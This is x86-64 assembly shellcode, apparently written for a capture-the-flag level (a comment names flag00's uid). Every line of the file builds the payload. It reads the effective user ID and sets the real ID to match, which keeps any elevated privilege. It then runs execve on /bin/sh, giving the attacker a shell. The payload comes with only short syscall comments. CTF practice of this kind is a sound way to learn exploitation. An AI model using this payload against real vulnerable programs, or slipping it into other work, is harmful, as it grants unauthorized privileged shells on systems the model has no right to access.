global _start
section .text
; 0x68732f6e69622f /bin/sh
_start:
   push 0x6b        ; SYS_geteuid = 107
   pop rax
   syscall; -> rax = euid (flag00's uid)
   mov rdi, rax     ; rdi = euid
   mov rsi, rax     ; rsi = euid
   push 0x71        ; SYS_setreuid = 113
   pop rax
   syscall; -> setreuid(euid, euid)
   xor rsi, rsi
   push rsi
   mov rdi, 0x68732f6e69622f
   push rdi
   push rsp
   pop rdi
   push 0x3b
   pop rax
   cdq
   syscall; -> execve(char* cmand, char **[])